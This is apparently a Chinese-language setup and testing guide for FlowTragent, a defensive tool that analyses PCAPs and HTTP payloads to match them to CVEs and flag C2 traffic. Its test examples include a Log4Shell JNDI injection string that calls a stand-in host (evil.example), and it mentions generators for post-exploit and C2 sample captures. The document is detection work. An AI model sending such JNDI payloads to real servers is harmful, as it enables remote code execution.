# FlowTragent WSL Ubuntu 启动与测试指南

本文档面向 Windows 11 + WSL2 Ubuntu 环境，目标是从零启动 FlowTragent，并跑通：

```text
PCAP / payload -> CSV -> NOVA-F style retrieval -> Agent analysis -> RAG context -> report
```

## 1. 克隆项目

```bash
mkdir -p ~/projects
cd ~/projects
git clone --recurse-submodules https://github.com/sishijiuhack/FlowTragent.git
cd FlowTragent
```

如果已经普通克隆过项目，补拉 NOVA-F 子模块：

```bash
git submodule update --init --recursive
```

作用：`libs/nova-f/` 是 FlowTragent 的底层检索引擎依赖，作为子模块独立管理。

## 2. 创建虚拟环境

推荐使用 Python 3.10 或 3.11。不要使用 Python 3.13，因为 `numpy==1.26.4`、`torch==2.3.1` 等依赖在 Python 3.13 下可能没有稳定 wheel，会触发源码编译失败。

如果你已经在项目里创建过错误版本的 `flowtragent_env`，先删除它：

```bash
rm -rf flowtragent_env
```

如果你正在使用 conda，最省事的方式是直接创建 Python 3.11 环境：

```bash
conda create -n flowtragent_py311 python=3.11 -y
conda activate flowtragent_py311
```

如果你想使用系统 venv，请确认系统 Python 版本：

```bash
python3 --version
python3.11 --version || true
```

```bash
sudo apt update
sudo apt install -y python3-venv python3-pip git

python3.11 -m venv flowtragent_env
source flowtragent_env/bin/activate
python -m pip install --upgrade pip setuptools wheel
```

看到终端前缀出现 `(flowtragent_env)` 即表示虚拟环境已激活。

## 3. 安装依赖

推荐给 pip 单独指定临时目录，避免 WSL 默认临时目录空间不足：

```bash
mkdir -p ~/pip-tmp ~/pip-cache
TMPDIR=~/pip-tmp PIP_CACHE_DIR=~/pip-cache python -m pip install -r requirements.txt
```

验证依赖：

```bash
python -m pip check
python - <<'PY'
import torch, faiss, sentence_transformers, chromadb, langchain, langgraph, scapy
print("deps ok")
PY
```

## 4. 跑 NOVA 检索 demo

```bash
python tests/test_nova.py
```

预期输出里应能看到类似：

```text
CVE-2021-44228
```

作用：验证 `NovaClient.search(payload)` 能返回 CVE 候选。

## 5. 跑 PCAP 端到端 demo

生成一个带 Log4Shell 风格 HTTP 请求的 demo PCAP：

```bash
python tests/make_demo_pcap.py
```

该 demo PCAP 同时包含请求和 `HTTP/1.1 200 OK` 响应，用于验证 request/response 配对、状态码提取和 Impact Assessment。

生成命令执行 / payload 下载样本：

```bash
python tests/make_post_exploit_pcap.py
python main.py --mode pcap --input data/pcap/demo_post_exploit.pcap --enable-rag
```

生成 HTTP beacon / C2 样本：

```bash
python tests/make_http_beacon_pcap.py
python main.py --mode pcap --input data/pcap/demo_http_beacon.pcap --enable-rag
```

运行 FlowTragent：

```bash
python main.py --mode pcap --input data/pcap/demo_attack.pcap --demo-index
```

启用本地 RAG 上下文：

```bash
python main.py --mode pcap --input data/pcap/demo_attack.pcap --demo-index --enable-rag
```

查看报告：

```bash
ls -lh reports/
tail -n +1 reports/*.md
```

作用：验证完整链路：

```text
PCAP -> data/csv/demo_attack.csv -> data/index demo index -> reports/*.md
```

## 6. payload 直接输入模式

```bash
python main.py \
  --mode payload \
  --input 'GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1 Host: victim' \
  --demo-index \
  --enable-rag
```

作用：无需 PCAP，直接用单条 payload 验证检索和报告链路。

## 7. Ollama 可选验证

安装 Ollama：

```bash
curl -fsSL https://ollama.com/install.sh | sh
ollama pull phi3:mini
```

启动服务：

```bash
OLLAMA_HOST=0.0.0.0:11434 ollama serve
```

另开一个 WSL 终端测试：

```bash
curl http://127.0.0.1:11434/api/generate \
  -d '{"model":"phi3:mini","prompt":"Summarize Log4Shell in one sentence.","stream":false}'
```

让 FlowTragent 调用 Ollama：

```bash
source flowtragent_env/bin/activate
python main.py \
  --mode pcap \
  --input data/pcap/demo_attack.pcap \
  --demo-index \
  --enable-rag \
  --enable-ollama
```

如果 Ollama 未启动，报告仍会生成，只是 `Agent Summary` 会提示 Ollama 不可用。

## 8. Web 界面

启动 Flask Web 界面：

```bash
source flowtragent_env/bin/activate
python web_app.py
```

然后在浏览器打开：

```text
http://127.0.0.1:5000
```

可以直接输入 payload，或上传 `.pcap/.pcapng` 文件生成报告。

如果在 Windows 浏览器访问 WSL 服务失败，确认 Flask 监听地址，必要时把 `web_app.py` 里的 `127.0.0.1` 改为 `0.0.0.0`。

## 9. live 抓包模式

安装 tcpdump：

```bash
sudo apt update
sudo apt install -y tcpdump
```

查看网卡：

```bash
ip addr
```

抓取 30 秒流量并分析：

```bash
sudo ~/projects/FlowTragent/flowtragent_env/bin/python main.py \
  --mode live \
  --interface eth0 \
  --capture-seconds 30 \
  --output-dir ./reports \
  --enable-rag
```

如果你想先手动抓包：

```bash
sudo tcpdump -i eth0 -w /tmp/test.pcap
python main.py --mode pcap --input /tmp/test.pcap --output-dir ./reports --enable-rag
```

## 10. 使用真实 NOVA-F 风格索引

FlowTragent 默认读取：

```text
data/index/faiss.index
data/index/meta.json
```

如果这两个文件存在，`NovaClient` 会优先使用真实索引；如果不存在或加了 `--demo-index`，才会使用 demo 索引。

训练 CSV 至少包含：

```text
id,payload_clean,cve_labels
```

示例：

```csv
id,payload_clean,cve_labels
1,"GET /?x=${jndi:ldap://a/b} HTTP/1.1","CVE-2021-44228"
```

构建索引：

```bash
python scripts/build_demo_index.py \
  --input data/csv/train_payloads.csv \
  --output-dir data/index \
  --model libs/nova-f/models/all-MiniLM-L6-v2
```

离线或 HuggingFace 不可用时，可使用本地哈希 embedding：

```bash
FLOWTRAGENT_OFFLINE=1 python scripts/build_demo_index.py \
  --input data/csv/train_payloads.csv \
  --output-dir data/index
```

注意：

- DataCon2025 官方授权数据集当前未随仓库分发，也不建议直接提交到公开仓库。
- 如需补充真实索引，请使用你本地拥有授权的数据集，转换为 `id,payload_clean,cve_labels` CSV 后构建。
- NOVA-F 新版子模块中提供了更多数据转换、评估、规则和结构化特征工具，可在 `libs/nova-f/utils/` 与 `libs/nova-f/src/` 下查看。

如果官方数据集位于：

```text
libs/nova-f/data/datacon2025-xlab-httpcve/data-release/train.json.gz
```

可直接转换带 CVE 标签的训练样本：

```bash
python scripts/convert_datacon_dataset.py \
  --input libs/nova-f/data/datacon2025-xlab-httpcve/data-release/train.json.gz \
  --output data/csv/datacon_train_labeled.csv
```

再构建 FlowTragent 检索索引：

```bash
python scripts/build_demo_index.py \
  --input data/csv/datacon_train_labeled.csv \
  --output-dir data/index \
  --model libs/nova-f/models/all-MiniLM-L6-v2
```

如果只想做离线冒烟测试：

```bash
FLOWTRAGENT_OFFLINE=1 python scripts/convert_datacon_dataset.py \
  --input libs/nova-f/data/datacon2025-xlab-httpcve/data-release/train.json.gz \
  --output data/csv/datacon_train_labeled_sample.csv \
  --limit 1000

FLOWTRAGENT_OFFLINE=1 python scripts/build_demo_index.py \
  --input data/csv/datacon_train_labeled_sample.csv \
  --output-dir data/index
```

本地可用模型目录：

```text
libs/nova-f/models/all-MiniLM-L6-v2
libs/nova-f/models/bge-small-en-v1.5
libs/nova-f/models/e5-small-v2
```

默认推荐先用 `all-MiniLM-L6-v2`，速度和资源占用更适合 WSL CPU 环境。

## 11. 常见错误修复

### pip 提示 No space left on device

```bash
mkdir -p ~/pip-tmp ~/pip-cache
TMPDIR=~/pip-tmp PIP_CACHE_DIR=~/pip-cache python -m pip install -r requirements.txt
```

### 找不到 venv

```bash
sudo apt update
sudo apt install -y python3-venv python3-pip
```

### tcpdump 权限问题

优先使用 `sudo`。如果想给 tcpdump 授权：

```bash
sudo setcap cap_net_raw,cap_net_admin=eip "$(command -v tcpdump)"
```

### HuggingFace 证书或网络失败

demo 和 RAG 默认可以离线运行：

```bash
FLOWTRAGENT_OFFLINE=1 python tests/test_nova.py
FLOWTRAGENT_OFFLINE=1 python main.py --mode pcap --input data/pcap/demo_attack.pcap --demo-index --enable-rag
```

### WSL 访问 Ollama 失败

确认 Ollama 监听地址：

```bash
OLLAMA_HOST=0.0.0.0:11434 ollama serve
curl http://127.0.0.1:11434/api/tags
```

## 12. DNS/TCP C2 样本验证

生成并分析 DNS tunneling + TCP beacon 样本：

```bash
python tests/make_dns_tcp_c2_pcap.py
python main.py --mode pcap --input data/pcap/demo_dns_tcp_c2.pcap --demo-index
```

运行对应回归测试：

```bash
python tests/test_dns_tcp_c2_pipeline.py
```

预期报告中应包含：

```text
DNS C2 / Tunneling
TCP Beacon
Possible compromise with C2 indicators
```

作用：验证 FlowTragent 在没有 HTTP payload 的 PCAP 中，仍能基于 DNS 查询模式和 TCP 周期连接识别疑似 C2 行为，并生成 Markdown/JSON 报告。
